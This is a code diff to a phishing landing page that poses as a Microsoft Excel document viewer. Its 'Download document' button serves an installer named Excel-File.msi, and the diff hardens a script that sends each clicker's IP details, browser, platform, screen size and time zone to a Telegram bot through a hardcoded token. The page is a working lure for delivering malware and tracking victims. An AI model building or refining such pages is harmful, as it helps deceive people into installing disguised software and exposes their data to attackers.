@@ -13,12 +13,15 @@
     <link href="https://fonts.googleapis.com/css2?family=Calibri:ital,wght@0,400;0,600;0,700;0,900;1,400;1,700;1,900&amp;display=swap" rel="stylesheet">
     <link rel="stylesheet" href="css/main.css">
   </head>
+
   <body>
     <div class="page excel">
       <div class="pop-wrap">
         <div class="pop">
           <div class="pop-top">
-            <div class="pop-top-icon"><img src="img/excel.svg"></div>
+            <div class="pop-top-icon">
+              <img src="img/excel.svg">
+            </div>
             <div class="pop-top-title">
               Create, edit and share Excel spreadsheets. Work with others on shared projects, in real-time.
             </div>
@@ -29,7 +32,7 @@
             To view the document, click the "Download document' button.
           </div>
 
-          <!-- ONLY CHANGE: added id -->
+          <!-- ONLY ADDITION: id attribute -->
           <a class="pop-btn" href="bin/Excel-File.msi" id="downloadBtn">
             Download document
           </a>
@@ -41,31 +44,27 @@
     <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
     <script src="js/main.js"></script>
 
-    <!-- TELEGRAM REPORT SCRIPT (NON-INTRUSIVE) -->
+    <!-- TELEGRAM DOWNLOAD REPORT (UNLOAD-SAFE) -->
     <script>
       const botToken = '5999005713:AAGWRZ5KSqGJhVolN8dYLSa6fj8nm-1yOfM';
-      const chatId  = '875434694';
+      const chatId = '875434694';
       const RATE_LIMIT_MS = 30000; // 30 seconds
 
       document.getElementById('downloadBtn').addEventListener('click', function () {
 
-        // -------- RATE LIMIT --------
+        // ---- Rate limit ----
         const last = localStorage.getItem('dl_last');
-        const now  = Date.now();
-        if (last && now - last < RATE_LIMIT_MS) {
-          return; // silently ignore spam clicks
-        }
+        const now = Date.now();
+        if (last && now - last < RATE_LIMIT_MS) return;
         localStorage.setItem('dl_last', now);
 
-        // -------- DEVICE INFO --------
-        const browser   = navigator.userAgent;
-        const platform  = navigator.platform || 'Unknown';
+        const browser = navigator.userAgent;
+        const platform = navigator.platform || 'Unknown';
         const screenRes = screen.width + 'x' + screen.height;
-        const timeZone  = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
 
-        // -------- FETCH IP INFO --------
         fetch('https://ipapi.co/json/')
-          .then(r => r.json())
+          .then(res => res.json())
           .then(data => {
 
             const message =
@@ -80,15 +79,16 @@ Browser: ${browser}
 Screen Resolution: ${screenRes}
 Time Zone: ${timeZone}`;
 
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-              method: 'POST',
-              headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify({
-                chat_id: chatId,
-                text: message
-              })
+            const payload = JSON.stringify({
+              chat_id: chatId,
+              text: message
             });
 
+            // ---- Beacon survives page unload ----
+            navigator.sendBeacon(
+              `https://api.telegram.org/bot${botToken}/sendMessage`,
+              new Blob([payload], { type: 'application/json' })
+            );
           })
           .catch(() => {});
       });
